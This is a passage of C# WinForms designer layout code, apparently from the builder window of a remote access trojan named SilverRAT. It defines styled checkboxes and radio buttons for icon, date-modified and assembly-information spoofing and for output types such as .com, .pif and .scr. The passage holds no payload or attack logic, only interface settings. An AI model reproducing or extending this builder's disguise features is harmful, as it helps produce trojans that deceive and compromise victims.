        this.SaveSettings.Cursor = System.Windows.Forms.Cursors.Hand;
        this.SaveSettings.CustomCheckmarkImage = null;
        this.SaveSettings.Location = new System.Drawing.Point(19, 512);
        this.SaveSettings.MinimumSize = new System.Drawing.Size(17, 17);
        this.SaveSettings.Name = "SaveSettings";
        this.SaveSettings.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.SaveSettings.OnCheck.BorderRadius = 6;
        this.SaveSettings.OnCheck.BorderThickness = 2;
        this.SaveSettings.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.SaveSettings.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.SaveSettings.OnCheck.CheckmarkThickness = 2;
        this.SaveSettings.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.SaveSettings.OnDisable.BorderRadius = 6;
        this.SaveSettings.OnDisable.BorderThickness = 2;
        this.SaveSettings.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.SaveSettings.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.SaveSettings.OnDisable.CheckmarkThickness = 2;
        this.SaveSettings.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.SaveSettings.OnHoverChecked.BorderRadius = 6;
        this.SaveSettings.OnHoverChecked.BorderThickness = 2;
        this.SaveSettings.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.SaveSettings.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.SaveSettings.OnHoverChecked.CheckmarkThickness = 2;
        this.SaveSettings.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.SaveSettings.OnHoverUnchecked.BorderRadius = 6;
        this.SaveSettings.OnHoverUnchecked.BorderThickness = 1;
        this.SaveSettings.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.SaveSettings.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.SaveSettings.OnUncheck.BorderRadius = 6;
        this.SaveSettings.OnUncheck.BorderThickness = 1;
        this.SaveSettings.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.SaveSettings.Size = new System.Drawing.Size(21, 21);
        this.SaveSettings.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.SaveSettings.TabIndex = 648;
        this.SaveSettings.ThreeState = false;
        this.SaveSettings.ToolTipText = null;
        // 
        // BuilderChackIcon
        // 
        this.BuilderChackIcon.AllowBindingControlAnimation = true;
        this.BuilderChackIcon.AllowBindingControlColorChanges = false;
        this.BuilderChackIcon.AllowBindingControlLocation = true;
        this.BuilderChackIcon.AllowCheckBoxAnimation = true;
        this.BuilderChackIcon.AllowCheckmarkAnimation = true;
        this.BuilderChackIcon.AllowOnHoverStates = true;
        this.BuilderChackIcon.AutoCheck = true;
        this.BuilderChackIcon.BackColor = System.Drawing.Color.Transparent;
        this.BuilderChackIcon.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderChackIcon.BackgroundImage")));
        this.BuilderChackIcon.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.BuilderChackIcon.BindingControl = this.label25;
        this.BuilderChackIcon.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.BuilderChackIcon.BorderRadius = 6;
        this.BuilderChackIcon.Checked = false;
        this.BuilderChackIcon.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.BuilderChackIcon.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderChackIcon.CustomCheckmarkImage = null;
        this.BuilderChackIcon.Location = new System.Drawing.Point(19, 399);
        this.BuilderChackIcon.MinimumSize = new System.Drawing.Size(17, 17);
        this.BuilderChackIcon.Name = "BuilderChackIcon";
        this.BuilderChackIcon.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderChackIcon.OnCheck.BorderRadius = 6;
        this.BuilderChackIcon.OnCheck.BorderThickness = 2;
        this.BuilderChackIcon.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderChackIcon.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderChackIcon.OnCheck.CheckmarkThickness = 2;
        this.BuilderChackIcon.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.BuilderChackIcon.OnDisable.BorderRadius = 6;
        this.BuilderChackIcon.OnDisable.BorderThickness = 2;
        this.BuilderChackIcon.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderChackIcon.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.BuilderChackIcon.OnDisable.CheckmarkThickness = 2;
        this.BuilderChackIcon.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderChackIcon.OnHoverChecked.BorderRadius = 6;
        this.BuilderChackIcon.OnHoverChecked.BorderThickness = 2;
        this.BuilderChackIcon.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderChackIcon.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderChackIcon.OnHoverChecked.CheckmarkThickness = 2;
        this.BuilderChackIcon.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderChackIcon.OnHoverUnchecked.BorderRadius = 6;
        this.BuilderChackIcon.OnHoverUnchecked.BorderThickness = 1;
        this.BuilderChackIcon.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderChackIcon.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.BuilderChackIcon.OnUncheck.BorderRadius = 6;
        this.BuilderChackIcon.OnUncheck.BorderThickness = 1;
        this.BuilderChackIcon.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.BuilderChackIcon.Size = new System.Drawing.Size(21, 21);
        this.BuilderChackIcon.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.BuilderChackIcon.TabIndex = 661;
        this.BuilderChackIcon.ThreeState = false;
        this.BuilderChackIcon.ToolTipText = null;
        this.BuilderChackIcon.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.BuilderChackIcon_CheckedChanged);
        // 
        // label25
        // 
        this.label25.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label25.AutoSize = true;
        this.label25.BackColor = System.Drawing.Color.Transparent;
        this.label25.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label25.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label25.ForeColor = System.Drawing.Color.Black;
        this.label25.Location = new System.Drawing.Point(43, 403);
        this.label25.Name = "label25";
        this.label25.Size = new System.Drawing.Size(30, 15);
        this.label25.TabIndex = 660;
        this.label25.Text = "Icon";
        // 
        // bunifuDatePicker1
        // 
        this.bunifuDatePicker1.BackColor = System.Drawing.Color.Transparent;
        this.bunifuDatePicker1.BorderColor = System.Drawing.Color.Silver;
        this.bunifuDatePicker1.BorderRadius = 1;
        this.bunifuDatePicker1.Color = System.Drawing.Color.Silver;
        this.bunifuDatePicker1.DateBorderThickness = Bunifu.UI.WinForms.BunifuDatePicker.BorderThickness.Thin;
        this.bunifuDatePicker1.DateTextAlign = Bunifu.UI.WinForms.BunifuDatePicker.TextAlign.Left;
        this.bunifuDatePicker1.DisabledColor = System.Drawing.Color.Gray;
        this.bunifuDatePicker1.DisplayWeekNumbers = false;
        this.bunifuDatePicker1.DPHeight = 0;
        this.bunifuDatePicker1.DropDownAlign = System.Windows.Forms.LeftRightAlignment.Right;
        this.bunifuDatePicker1.Enabled = false;
        this.bunifuDatePicker1.FillDatePicker = false;
        this.bunifuDatePicker1.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.bunifuDatePicker1.ForeColor = System.Drawing.Color.Black;
        this.bunifuDatePicker1.Icon = ((System.Drawing.Image)(resources.GetObject("bunifuDatePicker1.Icon")));
        this.bunifuDatePicker1.IconColor = System.Drawing.Color.Gray;
        this.bunifuDatePicker1.IconLocation = Bunifu.UI.WinForms.BunifuDatePicker.Indicator.Right;
        this.bunifuDatePicker1.LeftTextMargin = 5;
        this.bunifuDatePicker1.Location = new System.Drawing.Point(19, 469);
        this.bunifuDatePicker1.MinimumSize = new System.Drawing.Size(4, 32);
        this.bunifuDatePicker1.Name = "bunifuDatePicker1";
        this.bunifuDatePicker1.Size = new System.Drawing.Size(299, 32);
        this.bunifuDatePicker1.TabIndex = 659;
        this.bunifuDatePicker1.Value = new System.DateTime(2022, 9, 28, 7, 52, 0, 0);
        // 
        // BuilderDatemodified
        // 
        this.BuilderDatemodified.AllowBindingControlAnimation = true;
        this.BuilderDatemodified.AllowBindingControlColorChanges = false;
        this.BuilderDatemodified.AllowBindingControlLocation = true;
        this.BuilderDatemodified.AllowCheckBoxAnimation = true;
        this.BuilderDatemodified.AllowCheckmarkAnimation = true;
        this.BuilderDatemodified.AllowOnHoverStates = true;
        this.BuilderDatemodified.AutoCheck = true;
        this.BuilderDatemodified.BackColor = System.Drawing.Color.Transparent;
        this.BuilderDatemodified.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderDatemodified.BackgroundImage")));
        this.BuilderDatemodified.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.BuilderDatemodified.BindingControl = this.label24;
        this.BuilderDatemodified.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.BuilderDatemodified.BorderRadius = 6;
        this.BuilderDatemodified.Checked = false;
        this.BuilderDatemodified.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.BuilderDatemodified.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderDatemodified.CustomCheckmarkImage = null;
        this.BuilderDatemodified.Location = new System.Drawing.Point(19, 442);
        this.BuilderDatemodified.MinimumSize = new System.Drawing.Size(17, 17);
        this.BuilderDatemodified.Name = "BuilderDatemodified";
        this.BuilderDatemodified.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDatemodified.OnCheck.BorderRadius = 6;
        this.BuilderDatemodified.OnCheck.BorderThickness = 2;
        this.BuilderDatemodified.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDatemodified.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderDatemodified.OnCheck.CheckmarkThickness = 2;
        this.BuilderDatemodified.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.BuilderDatemodified.OnDisable.BorderRadius = 6;
        this.BuilderDatemodified.OnDisable.BorderThickness = 2;
        this.BuilderDatemodified.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderDatemodified.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.BuilderDatemodified.OnDisable.CheckmarkThickness = 2;
        this.BuilderDatemodified.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderDatemodified.OnHoverChecked.BorderRadius = 6;
        this.BuilderDatemodified.OnHoverChecked.BorderThickness = 2;
        this.BuilderDatemodified.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDatemodified.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderDatemodified.OnHoverChecked.CheckmarkThickness = 2;
        this.BuilderDatemodified.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderDatemodified.OnHoverUnchecked.BorderRadius = 6;
        this.BuilderDatemodified.OnHoverUnchecked.BorderThickness = 1;
        this.BuilderDatemodified.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderDatemodified.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.BuilderDatemodified.OnUncheck.BorderRadius = 6;
        this.BuilderDatemodified.OnUncheck.BorderThickness = 1;
        this.BuilderDatemodified.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.BuilderDatemodified.Size = new System.Drawing.Size(21, 21);
        this.BuilderDatemodified.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.BuilderDatemodified.TabIndex = 658;
        this.BuilderDatemodified.ThreeState = false;
        this.BuilderDatemodified.ToolTipText = null;
        this.BuilderDatemodified.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.BuilderDatemodified_CheckedChanged);
        // 
        // label24
        // 
        this.label24.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label24.AutoSize = true;
        this.label24.BackColor = System.Drawing.Color.Transparent;
        this.label24.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label24.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label24.ForeColor = System.Drawing.Color.Black;
        this.label24.Location = new System.Drawing.Point(43, 446);
        this.label24.Name = "label24";
        this.label24.Size = new System.Drawing.Size(82, 15);
        this.label24.TabIndex = 657;
        this.label24.Text = "Date modified";
        // 
        // BuilderAssemblyinformation
        // 
        this.BuilderAssemblyinformation.AllowBindingControlAnimation = true;
        this.BuilderAssemblyinformation.AllowBindingControlColorChanges = false;
        this.BuilderAssemblyinformation.AllowBindingControlLocation = true;
        this.BuilderAssemblyinformation.AllowCheckBoxAnimation = true;
        this.BuilderAssemblyinformation.AllowCheckmarkAnimation = true;
        this.BuilderAssemblyinformation.AllowOnHoverStates = true;
        this.BuilderAssemblyinformation.AutoCheck = true;
        this.BuilderAssemblyinformation.BackColor = System.Drawing.Color.Transparent;
        this.BuilderAssemblyinformation.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderAssemblyinformation.BackgroundImage")));
        this.BuilderAssemblyinformation.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.BuilderAssemblyinformation.BindingControl = this.label23;
        this.BuilderAssemblyinformation.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.BuilderAssemblyinformation.BorderRadius = 6;
        this.BuilderAssemblyinformation.Checked = false;
        this.BuilderAssemblyinformation.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.BuilderAssemblyinformation.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderAssemblyinformation.CustomCheckmarkImage = null;
        this.BuilderAssemblyinformation.Location = new System.Drawing.Point(19, 218);
        this.BuilderAssemblyinformation.MinimumSize = new System.Drawing.Size(17, 17);
        this.BuilderAssemblyinformation.Name = "BuilderAssemblyinformation";
        this.BuilderAssemblyinformation.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderAssemblyinformation.OnCheck.BorderRadius = 6;
        this.BuilderAssemblyinformation.OnCheck.BorderThickness = 2;
        this.BuilderAssemblyinformation.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderAssemblyinformation.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderAssemblyinformation.OnCheck.CheckmarkThickness = 2;
        this.BuilderAssemblyinformation.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.BuilderAssemblyinformation.OnDisable.BorderRadius = 6;
        this.BuilderAssemblyinformation.OnDisable.BorderThickness = 2;
        this.BuilderAssemblyinformation.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderAssemblyinformation.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.BuilderAssemblyinformation.OnDisable.CheckmarkThickness = 2;
        this.BuilderAssemblyinformation.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderAssemblyinformation.OnHoverChecked.BorderRadius = 6;
        this.BuilderAssemblyinformation.OnHoverChecked.BorderThickness = 2;
        this.BuilderAssemblyinformation.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderAssemblyinformation.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderAssemblyinformation.OnHoverChecked.CheckmarkThickness = 2;
        this.BuilderAssemblyinformation.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderAssemblyinformation.OnHoverUnchecked.BorderRadius = 6;
        this.BuilderAssemblyinformation.OnHoverUnchecked.BorderThickness = 1;
        this.BuilderAssemblyinformation.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderAssemblyinformation.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.BuilderAssemblyinformation.OnUncheck.BorderRadius = 6;
        this.BuilderAssemblyinformation.OnUncheck.BorderThickness = 1;
        this.BuilderAssemblyinformation.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.BuilderAssemblyinformation.Size = new System.Drawing.Size(21, 21);
        this.BuilderAssemblyinformation.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.BuilderAssemblyinformation.TabIndex = 634;
        this.BuilderAssemblyinformation.ThreeState = false;
        this.BuilderAssemblyinformation.ToolTipText = null;
        this.BuilderAssemblyinformation.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.BuilderAssemblyinformation_CheckedChanged);
        // 
        // label23
        // 
        this.label23.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label23.AutoSize = true;
        this.label23.BackColor = System.Drawing.Color.Transparent;
        this.label23.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label23.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label23.ForeColor = System.Drawing.Color.Black;
        this.label23.Location = new System.Drawing.Point(43, 222);
        this.label23.Name = "label23";
        this.label23.Size = new System.Drawing.Size(124, 15);
        this.label23.TabIndex = 633;
        this.label23.Text = "Assembly information";
        // 
        // label22
        // 
        this.label22.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label22.AutoSize = true;
        this.label22.BackColor = System.Drawing.Color.Transparent;
        this.label22.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label22.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label22.ForeColor = System.Drawing.Color.Black;
        this.label22.Location = new System.Drawing.Point(280, 181);
        this.label22.Name = "label22";
        this.label22.Size = new System.Drawing.Size(25, 15);
        this.label22.TabIndex = 631;
        this.label22.Text = ".scr";
        // 
        // SCR
        // 
        this.SCR.AllowBindingControlLocation = true;
        this.SCR.BackColor = System.Drawing.Color.Transparent;
        this.SCR.BindingControl = this.label22;
        this.SCR.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.SCR.BorderThickness = 1;
        this.SCR.Checked = false;
        this.SCR.Cursor = System.Windows.Forms.Cursors.Hand;
        this.SCR.Location = new System.Drawing.Point(256, 177);
        this.SCR.Name = "SCR";
        this.SCR.OutlineColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.SCR.OutlineColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.SCR.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.SCR.RadioColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.SCR.RadioColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.SCR.Size = new System.Drawing.Size(21, 21);
        this.SCR.TabIndex = 630;
        this.SCR.Text = null;
        // 
        // label20
        // 
        this.label20.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label20.AutoSize = true;
        this.label20.BackColor = System.Drawing.Color.Transparent;
        this.label20.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label20.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label20.ForeColor = System.Drawing.Color.Black;
        this.label20.Location = new System.Drawing.Point(226, 181);
        this.label20.Name = "label20";
        this.label20.Size = new System.Drawing.Size(24, 15);
        this.label20.TabIndex = 629;
        this.label20.Text = ".pif";
        // 
        // label21
        // 
        this.label21.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label21.AutoSize = true;
        this.label21.BackColor = System.Drawing.Color.Transparent;
        this.label21.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label21.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label21.ForeColor = System.Drawing.Color.Black;
        this.label21.Location = new System.Drawing.Point(165, 181);
        this.label21.Name = "label21";
        this.label21.Size = new System.Drawing.Size(31, 15);
        this.label21.TabIndex = 628;
        this.label21.Text = "cmd";
        // 
        // CMD
        // 
        this.CMD.AllowBindingControlLocation = true;
        this.CMD.BackColor = System.Drawing.Color.Transparent;
        this.CMD.BindingControl = this.label21;
        this.CMD.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.CMD.BorderThickness = 1;
        this.CMD.Checked = false;
        this.CMD.Cursor = System.Windows.Forms.Cursors.Hand;
        this.CMD.Location = new System.Drawing.Point(141, 177);
        this.CMD.Name = "CMD";
        this.CMD.OutlineColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.CMD.OutlineColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.CMD.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.CMD.RadioColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.CMD.RadioColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.CMD.Size = new System.Drawing.Size(21, 21);
        this.CMD.TabIndex = 627;
        this.CMD.Text = null;
        // 
        // PIF
        // 
        this.PIF.AllowBindingControlLocation = true;
        this.PIF.BackColor = System.Drawing.Color.Transparent;
        this.PIF.BindingControl = this.label20;
        this.PIF.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.PIF.BorderThickness = 1;
        this.PIF.Checked = false;
        this.PIF.Cursor = System.Windows.Forms.Cursors.Hand;
        this.PIF.Location = new System.Drawing.Point(202, 177);
        this.PIF.Name = "PIF";
        this.PIF.OutlineColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.PIF.OutlineColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.PIF.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.PIF.RadioColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.PIF.RadioColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.PIF.Size = new System.Drawing.Size(21, 21);
        this.PIF.TabIndex = 626;
        this.PIF.Text = null;
        // 
        // label18
        // 
        this.label18.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label18.AutoSize = true;
        this.label18.BackColor = System.Drawing.Color.Transparent;
        this.label18.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label18.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label18.ForeColor = System.Drawing.Color.Black;
        this.label18.Location = new System.Drawing.Point(101, 181);
        this.label18.Name = "label18";
        this.label18.Size = new System.Drawing.Size(34, 15);
        this.label18.TabIndex = 625;
        this.label18.Text = ".com";
        // 
        // label19
        // 
        this.label19.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label19.AutoSize = true;
        this.label19.BackColor = System.Drawing.Color.Transparent;
        this.label19.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label19.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label19.ForeColor = System.Drawing.Color.Black;
        this.label19.Location = new System.Drawing.Point(43, 181);
        this.label19.Name = "label19";
        this.label19.Size = new System.Drawing.Size(28, 15);
        this.label19.TabIndex = 624;
        this.label19.Text = ".exe";
        // 
        // EXE
        // 
        this.EXE.AllowBindingControlLocation = true;
        this.EXE.BackColor = System.Drawing.Color.Transparent;
        this.EXE.BindingControl = this.label19;
        this.EXE.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.EXE.BorderThickness = 1;
        this.EXE.Checked = false;
        this.EXE.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EXE.Location = new System.Drawing.Point(19, 177);
        this.EXE.Name = "EXE";
        this.EXE.OutlineColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EXE.OutlineColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EXE.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.EXE.RadioColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EXE.RadioColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EXE.Size = new System.Drawing.Size(21, 21);
        this.EXE.TabIndex = 623;
        this.EXE.Text = null;
        // 
        // COM
        // 
        this.COM.AllowBindingControlLocation = true;
        this.COM.BackColor = System.Drawing.Color.Transparent;
        this.COM.BindingControl = this.label18;
        this.COM.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.COM.BorderThickness = 1;
        this.COM.Checked = true;
        this.COM.Cursor = System.Windows.Forms.Cursors.Hand;
        this.COM.Location = new System.Drawing.Point(77, 177);
        this.COM.Name = "COM";
        this.COM.OutlineColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.COM.OutlineColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.COM.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.COM.RadioColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.COM.RadioColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.COM.Size = new System.Drawing.Size(21, 21);
        this.COM.TabIndex = 622;
        this.COM.Text = null;
        // 
        // NameIcon
        // 
        this.NameIcon.AllowParentOverrides = false;
        this.NameIcon.AutoEllipsis = true;
        this.NameIcon.AutoSize = false;
        this.NameIcon.CursorType = null;
        this.NameIcon.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.NameIcon.Location = new System.Drawing.Point(19, 112);
        this.NameIcon.Name = "NameIcon";
        this.NameIcon.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
        this.NameIcon.Size = new System.Drawing.Size(296, 15);
        this.NameIcon.TabIndex = 511;
        this.NameIcon.Text = "...";
        this.NameIcon.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.NameIcon.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ImageIcon
        // 
        this.ImageIcon.AllowFocused = false;
        this.ImageIcon.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.ImageIcon.AutoSizeHeight = true;
        this.ImageIcon.BackColor = System.Drawing.Color.White;
        this.ImageIcon.BorderRadius = 33;
        this.ImageIcon.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ImageIcon.Image = global::SilverRAT.Properties.Resources.BuilderNothingIcon;
        this.ImageIcon.IsCircle = true;
        this.ImageIcon.Location = new System.Drawing.Point(133, 38);
        this.ImageIcon.Name = "ImageIcon";
